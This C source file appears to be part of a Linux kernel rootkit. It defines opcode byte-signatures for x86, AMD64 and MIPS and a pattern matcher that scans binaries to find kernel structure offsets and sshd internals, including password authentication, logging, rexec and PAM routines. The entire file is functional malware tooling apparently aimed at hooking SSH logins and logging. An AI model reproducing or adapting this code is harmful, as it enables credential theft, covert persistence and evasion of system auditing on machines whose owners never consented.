#include <defs.h>
#include <opsig.h>

asm(".globl opsigstart");

extern struct ksyms rksyms;

#ifdef __IA32__
char *notify_change1[]   = {"\x8b$$", "\x40--\x80$$", "!!&&"};
char *notify_change2[]   = {"\x8b$$", "\x40--\x80$$", "&&$$",  "&&$$", "\x00$$", "\x00$$"};
char *ip_mc_output1[]    = {"\x66$$", "\xc7$$", "\x40--\x47$$","&&$$", "\x08$$", "!!\x00$$"}; 
char *ip_options_noff1[] = {"\x8b$$", "**", "&&$$", "\x00", "\x00", "!!\x00$$"};

char **notify__change[]  = {notify_change1, notify_change2};
char **ip_options_noff[] = {ip_options_noff1};
char **ip_mc_output[]    = {ip_mc_output1};

/* ssh opsigs */
char *ssh_main1[]        = {"\x50$$",   "\x51$$", "\x56$$", "\xff$$", "\xb3$$", "&&$$", "&&$$", "&&$$", "!!&&$$"};
char *ssh_rexec1[]       = {"\xc7$$",   "\x83$$", "&&$$", "&&$$", "&&$$", "&&$$", "\x00$$", "\x00$$", "\x00$$","!!\x00$$"};
char *ssh_authpwd1[]     = {"\x8b$$",   "\x83\x8b\x93\xb3\x93\xab$$", "&&$$", "&&$$", "&&\xff\x00$$", "!!&&$$"};
char *ssh_do_log1[]      = {"%%\xe8$$", "&&$$", "&&$$", "&&\xff$$", "!!&&\xff$$"};
char *ssh_logit1[]       = {"\x8d$$",   "!!\x83\x8b\x93\xb3\xbb\ab$$"};
char *ssh_pam1[]         = {"\x8d$$",   "!!\x83\x8b\x93\xb3\xbb\ab$$"};
char *ssh_pam_pro1[]     = {"\x55$$",   "\x89$$", "\xe5$$", "\x83$$", "!!\xec$$"};

char **ssh_mainf[]       = {ssh_main1};
char **ssh_rexec[]       = {ssh_rexec1};
char **ssh_authpwd[]     = {ssh_authpwd1};
char **ssh_do_log[]      = {ssh_do_log1};
char **ssh_logit[]       = {ssh_logit1};
char **ssh_pam[]         = {ssh_pam1};
char **ssh_pam_pro[]     = {ssh_pam_pro1};

#endif

#ifdef __AMD64__
/* kern opsigs */
char *ip_options_noff1[] = {"\x0f$$", "\xb7$$", "\x87\x9f\x8f\x97\xaf$$", "&&$$", "\x00$$", "\x00$$", "!!\x00$$"};
char *ip_options_noff2[] = {"\x44$$", "\x0f$$", "\xb7$$", "\x9f\xa7\xaf\xb7\xbf$$", "&&$$", "\x00$$", "!!\x00$$"};
char *ip_options_noff3[] = {"\x44$$", "\x8b$$", "\x9f\xa7\xaf\xb7\xbf$$", "&&$$", "\x00$$", "\x00$$", "!!\x00$$"};
char *ip_options_noff4[] = {"\x8b$$", "\xaf\x87\x9f\x8f\x97$$", "&&$$", "\x00$$", "\x00$$", "!!\x00$$"};
char *ip_options_hoff1[] = {"\x4c$$", "\x03$$", "\xa7\xaf\xb7\xbf$$", "&&$$", "\x00$$", "\x00$$", "!!\x00$$"};
char *ip_options_hoff2[] = {"\x48$$", "\x03$$", "\xaf\x87\x9f\x8f\x97\xb7$$","&&$$","\x00$$","\x00$$","!!\x00$$"};
char *notify_change1[]   = {"\x48$$", "\x8b$$", "\x47\x5f\x6f\x4f\x57\x77$$", "!!&&$$"};
char *notify_change2[]   = {"\x4c$$", "\x8b$$", "\x5f\x67\x6f\x77\x7f$$",     "!!&&$$"};
char *ip_mc_output1[]    = {"\x66$$", "**",     "\x47$$", "!!&&$$"};
char *ip_mc_output2[]    = {"\xb8$$", "\x08$$", "\x00$$", "\x00$$", "\x00$$", "\x66$$", "**", "\x47$$", "!!&&$$"};
char *mov_follow_reg[]   = {"\x48$$", "\x8b$$", "@@\x47\x5f\x4f\x57$$", "&&$$", ".*", "\x48$$", "\x8b$$", "@@", "!!&&"};

char **notify__change[]  = {notify_change1,   notify_change2};      /* mov    boff(%rdi), %reg  */
char **ip_options_noff[] = {ip_options_noff1, ip_options_noff2,     /* movzwl boff(%rdi), %reg  */
                            ip_options_noff3, ip_options_noff4};    /* mov    boff(%rdi), %regd */
char **ip_options_hoff[] = {ip_options_hoff1, ip_options_hoff2};    /* add    boff(%rdi), %reg  */
char **ip_mc_output[]    = {ip_mc_output1,    ip_mc_output2};       /* movw $0x8, boff(%rdi)    */

/* ssh opsigs */
char *ssh_main1[]        = {"\x48$$", "\x8b\x8d$$", "\x3d$$", "&&$$", "&&$$", "&&$$", "&&$$", "\xe8$$","**","**","**","**","!!\xf4\xeb$$"};
char *ssh_main2[]        = {"\x48$$", "\xc7$$", "\xc7$$", "&&$$", "&&$$", "&&$$", "&&$$", "!!\xe8$$"};
char *ssh_rexec1[]       = {"\xc7$$", "\x05$$", "&&$$", "&&$$", "&&$$", "&&$$", "\x00$$", "\x00$$", "\x00$$","!!\x00$$"};
char *ssh_authpwd1[]     = {"\x48$$", "\x8b\x8d", ".*$$", "\x48$$", "\x89$$", "**", "\x48$$", "\x89$$", "**", ".*$$", 
                            "\x85$$", "**", "\x75$$", "**", "\xe8$$", "&&$$", "&&$$", "&&$$", "!!&&$$"};
char *ssh_authpwd2[]     = {"\x48$$", "\x8d$$", ".*", "\x48$$", "\x89$$", "**", "\x48$$", "\x89$$", ".*", 
                            "\x83$$", "**", "\x00$$", ".*", "\xe8$$","&&$$", "&&$$", "&&$$", "!!&&$$"};
char *ssh_authpwd3[]     = {"\x48$$", "\x8b$$", ".*", "\x8b$$", "\x00$$", "\x85$$", "\xc0$$", "\x75$$", ".*", "\xe8$$", "!!**$$"};
char *ssh_do_log1[]      = {"\x48$$", "\x89$$", "**", "\x24\xff$$", "**", "\xe8$$", "&&$$", "&&$$", "&&$$", "!!&&$$"};
char *ssh_pam_pro1[]     = {"\x48$$", "\x8b\x8d\x83$$", ".*", "\x48$$", "!!\x8d$$"};
char *lea_rip_reg[]      = {"\x48$$", "!!\x8d$$" };

char **ssh_maind[]       = {ssh_main1, ssh_main2};
char **ssh_rexec[]       = {ssh_rexec1};
char **ssh_authpwd[]     = {ssh_authpwd1, ssh_authpwd2, ssh_authpwd3};
char **ssh_do_log[]      = {ssh_do_log1};
char **ssh_lea[]         = {lea_rip_reg};
char **ssh_pam_pro[]     = {ssh_pam_pro1};
#endif

#ifdef __MIPS32__
/* mips32 opcodes */
static char *lw_reg_boff_a0[]    = {"\x8c$$", "\x81--\x99$$", "\x00$$", "!!&&"};
static char *sh_reg_boff_reg[]   = {"\xa4--\xa7$$", "**", "\x00$$", "!!&&"};
static char *lw_reg_boff_gp[]    = {"\x8f$$", "\x81--\x97\x9e$$","**$$","!!**$$"};
static char *lw_gp_boff_sp[]     = {"\x8f$$", "\xbc$$", "\x00$$", "!!**$$"};
static char *sw_gp_boff_sp[]     = {"\xaf$$", "\xbc$$", "\x00$$", "!!**$$"};
static char *lui_gp_boff[]       = {"\x3c$$", "\x1c$$", "\x00$$", "!!\x42$$"};
static char *jalr_t2[]           = {"\x01$$", "\x40$$", "\xf8$$", "!!\x09$$"};
/* mips32 sigs */
static char **notify_change[]    = {lw_reg_boff_a0};
static char **ip_options_noff[]  = {lw_reg_boff_a0};
static char **ip_mc_output[]     = {sh_reg_boff_reg};
static char **lui_gp[]           = {lui_gp_boff};
static char **lw_gp[]            = {lw_reg_boff_gp};
static char **lw_gp_sp[]         = {lw_gp_boff_sp};
static char **sw_gp_sp[]         = {sw_gp_boff_sp};
static char **jalr_sct[]         = {jalr_t2};
#endif

#ifdef __MIPS64__
/* mips64 opcodes */
char *ld_reg_boff_a0[]    = {"\xdc$$", "\x81--\x99$$", "\x00$$", "!!&&"};
char *lwu_reg_boff_a0[]   = {"\x9c$$", "**", "\x00$$", "!!&&"};
char *sh_reg_boff_reg[]   = {"\xa4--\xa7$$", "**", "\x00$$", "!!&&"};
/* mips64 sigs */
char **notify_change[]    = {ld_reg_boff_a0};
char **ip_options_hoff[]  = {ld_reg_boff_a0};
char **ip_mc_output[]	  = {sh_reg_boff_reg};
#endif

struct opsig {
	int signame;
	char ***sigs;
	unsigned long offset;
	int nr_sigs, opinc, nb_max;
};

static struct opsig *opsigs = (void *)-1;

static struct opsig kern_opsig[KERN_OPS] = {
#ifdef __IA32__
/* mov boff(%eax), %reg) */ {DENTRY_INODE, notify__change,  0, 1, 1, 100},
/* movw $0x8, boff(%reg) */ {SK_BUFF_PROT, ip_mc_output,    0, 1, 1, 100},
/* mov boff(%rax), %reg  */ {SK_BUFF_NOFF, ip_options_noff, 0, 1, 1, 100},
#endif 

#ifdef __AMD64__
/* mov boff(%rdi), %reg) */ {DENTRY_INODE, notify__change,  0, 2, 1, 100},
/* movw $0x8, boff(%reg) */ {SK_BUFF_PROT, ip_mc_output,    0, 1, 1, 100},
/* mov boff(%rdi), %reg) */ {SK_BUFF_NOFF, ip_options_noff, 0, 4, 1, 100},
/* add boff(%reg), %reg) */ {SK_BUFF_HOFF, ip_options_hoff, 0, 2, 1, 100}
#endif

#ifdef __MIPS32__
/* lw    $reg, boff($a0)  */ {DENTRY_INODE, notify_change,   0, 1, 4, 100},
/* sh    $reg, boff($reg) */ {SK_BUFF_PROT, ip_mc_output,    0, 1, 4, 200},
/* lw    $reg  boff($a0)  */ {SK_BUFF_NOFF, ip_options_noff, 0, 1, 4, 100},
/* lui   $gp,  boff       */ {LUI_GP,       lui_gp,          0, 1, 4,2000},
/* lw    $reg, hoff($gp)  */ {LW_GP,        lw_gp,           0, 1, 4,2000},
/* lw    $gp,  boff($sp)  */ {LW_GP_SP,     lw_gp_sp,        0, 1, 4,2000},
/* sw    $gp,  boff       */ {SW_GP_SP,     sw_gp_sp,        0, 1, 4,2000},
/* jalr  $t2              */ {JALR_SCT,     jalr_sct,        0, 1, 4, 400}
#endif


#ifdef __MIPS64__
/* ld  $reg, boff($a0)   */ {DENTRY_INODE, notify_change,   0, 1, 4, 100},
/* sh  $reg, boff($reg)  */ {SK_BUFF_PROT, ip_mc_output,    0, 1, 4, 200}
/* lwu $reg  boff($a0)   */ {SK_BUFF_NOFF, ip_options_noff, 0, 1, 4, 100},
/* ld  $reg  boff($a0)   */ {SK_BUFF_HOFF, ip_options_hoff, 0, 1, 4, 100},
#endif
};

static struct opsig ssh_opsig[SSH_OPS] = {
#ifdef __IA32__
/* lea off(%ebx), %reg */ {SSH_MAIN,    ssh_mainf,   0, 1, 1, 0},
/* movl $0,rexec(%ebx) */ {SSH_REXEC,   ssh_rexec,   0, 1, 1, 0},
/* mov,test,jne,call   */ {SSH_AUTHPWD, ssh_authpwd, 0, 1, 1, 0},
/* mov %rsi, call      */ {SSH_DO_LOG,  ssh_do_log,  0, 1, 1, 0},
/* lea str(%rip), %reg */ {SSH_LOGIT,   ssh_logit,   0, 1, 1, 0},
/* lea str(%rbx), %reg */ {SSH_PAM,     ssh_pam,     0, 1, 1, 0},
/* do_pam prologue     */ {SSH_PAM_PRO, ssh_pam_pro, 0, 1, 1, 0}
#endif

#ifdef __AMD64__
/* mov/lea $main, %rdi */ {SSH_MAIN,    ssh_maind,   0, 2, 1, 0},
/* movl $0, rexec_flag */ {SSH_REXEC,   ssh_rexec,   0, 1, 1, 0},
/* mov,test,jne,call   */ {SSH_AUTHPWD, ssh_authpwd, 0, 3, 1, 0},
/* mov %rsi, call      */ {SSH_DO_LOG,  ssh_do_log,  0, 1, 1, 0},
/* lea str(%rip), %reg */ {SSH_LOGIT,   ssh_lea,     0, 1, 1, 0},
/* lea str(%rip), %reg */ {SSH_PAM,     ssh_lea,     0, 1, 1, 0},
/* do_pam prologue     */ {SSH_PAM_PRO, ssh_pam_pro, 0, 1, 1, 0}
#endif
};

int
opinterval(unsigned char op, unsigned char *sig)
{
	int b1,b2,i,n;

	b1 = *(unsigned char *)(sig-1);
	b2 = *(unsigned char *)(sig+2);
	n  = b2-b1;
	for (i = 0; i < n; i++) {
		if (op == b1++)
			return 1;
	}
	return 0;
}

int
bigendian()
{
    int v = 1;
    return ((*(char*)&v)==0);
}

#define OP_ANY  1
#define OP_END  2
#define OP_INT  3
#define OP_REF  4
#define OP_NXT  5
#define OP_OP   6
#define OP_FREG 7
#define OP_RNG  8
#define OP_MEM  9

#define FREG_START 1
#define FREG_NEXT  2

#define SIGOP(c1) \
({ \
	int c2 = *(sig+1); \
	int op; \
	if (c == '*' && c2 == '*') \
		op = OP_ANY; \
	else if (c == '!' && c2 == '!')\
		op = OP_END; \
	else if (c == '-' && c2 == '-') \
		op = OP_INT; \
	else if (c == '&' && c2 == '&') \
		op = OP_REF; \
	else if (c == '$' && c2 == '$') \
		op = OP_NXT; \
	else if (c == '.' && c2 == '*') \
		op = OP_RNG; \
	else if (c == '%' && c2 == '%') \
		op = OP_MEM;\
	else \
		op = OP_OP; \
	op; \
})

int
sigmatch(struct opsig *opsig, struct opref *opref, int idx)
{
	unsigned char **sigs   = (unsigned char **)opsig->sigs[idx];
	unsigned char *curpos  = opref->addr, *p = opref->addr;
	unsigned char *sig;
	unsigned char *start   = p;
	unsigned char *maxaddr = opref->end;
	unsigned long nb_max   = (opref->nb_max?opref->nb_max:opsig->nb_max);
	unsigned char op, c;
	int refpos = 0, epos = 0, end = 0, cursig = 0;
	int f_pos, r_max, f_dreg, f_reg = 0;
	int debug = (opref->opaddr == (char *)OPSIG_DBG ? 1 : 0);

	if (bigendian())
		epos = (sizeof(unsigned long)-1);

	opref->offset = 0;
	sig = (*(sigs+cursig));
	while (1) {
		op = *p;
		c  = *(unsigned char *)sig;
		if (debug){printk("sigc: %c sig: %x", c, *sig);printk(" op: %x\n",op);}
		switch (SIGOP(c)) {
			case OP_ANY:
				break;
			case OP_END:
				end = 1;
				sig += 2;
				continue;
			case OP_INT:
				if (opinterval(op, sig))
					break; /* found match */
				sig += 3;
				continue;
			case OP_REF:
				if (debug) printk("opref: %x offset: %x refpos: %d\n", op, opref->offset, refpos);
				*(unsigned char *)((unsigned char *)&opref->offset+refpos) = op;
				refpos++;
				break;
			case OP_NXT:
				if (end && (op == *(sig-1)))
					return 0;
				if (end) {
					end = 0;
					opref->offset = 0;
					refpos = 0;
				}
				curpos += opsig->opinc;
				if (curpos-start >= nb_max)
					return 0;
				if (maxaddr && (curpos >= maxaddr))
					return 0;
				p = curpos;
				cursig = 0;
				sig = (*(sigs+cursig));
				continue;
			case OP_FREG:
				if (!f_reg) {
					f_reg = FREG_START;
					sig++;
					continue;
				}
				if (f_reg == FREG_NEXT) {
					if (f_dreg == SREGX(op))
						break;
					else {
						cursig = f_pos;
						p++;
						continue;
					}
				}
			case OP_RNG:
				sig = (*(sigs+(++cursig)));
				f_pos = cursig;
				r_max = *(sigs+cursig);
				c  = *(unsigned char *)sig;
				if (r_max) {
					*(int *)r_max=0;
					while (*p != c && r_max--) p++;
				}
				else
					while (*p != c) p++;
				break;
			case OP_MEM:
				opref->opaddr = curpos;
				sig += 2;
				continue;
			case OP_OP:
				sig++;
				if (c != op) {
//					opref->offset = 0;
					refpos = 0;
					continue;
				}
				if (debug) printk("matched: %x curpos: %p\n", op, curpos-start);
		}

		if (f_reg == FREG_START) {
			f_dreg = DREGX(op);
			f_reg = FREG_NEXT;
		}

		if (end) {
			opref->addr = curpos;
			return 1;
		}

		p++;
		cursig++;
		sig = (*(sigs+cursig));
	}
}

void
rkregopsig(int opsig)
{
	switch (opsig) {
		case KERN_OPSIG:
			opsigs = (struct opsig *)kern_opsig;
			break;
		case SSH_OPSIG:
			opsigs = (struct opsig *)ssh_opsig;
			break;
	}
}

unsigned long
rkopsig(struct opref *opref, int opidx)
{
	struct opsig *opsig = &opsigs[opidx];
	int i = 0;

	while (i < opsig->nr_sigs) {
		if (sigmatch(opsig, opref, i++))
			return opref->offset;
	}
	return (-1);
}
